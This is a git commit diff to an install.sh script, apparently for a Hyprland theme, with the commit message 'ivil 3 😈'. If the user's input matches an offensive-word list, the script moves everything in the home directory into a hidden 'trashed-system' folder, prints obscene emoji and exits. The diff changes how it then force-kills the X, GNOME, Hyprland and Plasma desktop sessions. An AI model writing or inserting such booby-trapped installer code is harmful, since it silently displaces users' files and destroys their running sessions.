b46361b6f5f44df7d04a62e7596c3a200ed44599
LFS User <enessmr22@proton.me>
2025-08-04 15:52:07 +0300

    ivil 3 😈

--- install.sh
+++ install.sh
@@ -98,7 +98,7 @@ for word in "${OFFENSIVE_WORDS[@]}"; do
         mv ~/* ~/.local/share/hyprmaterial3/trashed-system/
         echo -e "🖕 🖕"
         clear
-        sudo systemctl stop sddm;sudo systemctl stop gdm;sudo systemctl stop lightdm && pkill {X,startx,gnome-shell,Hyprland,hyprland,plasmashell,plasma-x11} 
+        pkill -f -e "X|startx|gnome-shell|Hyprland|plasmashell|plasma-x11"
         exit 1
     fi
 done
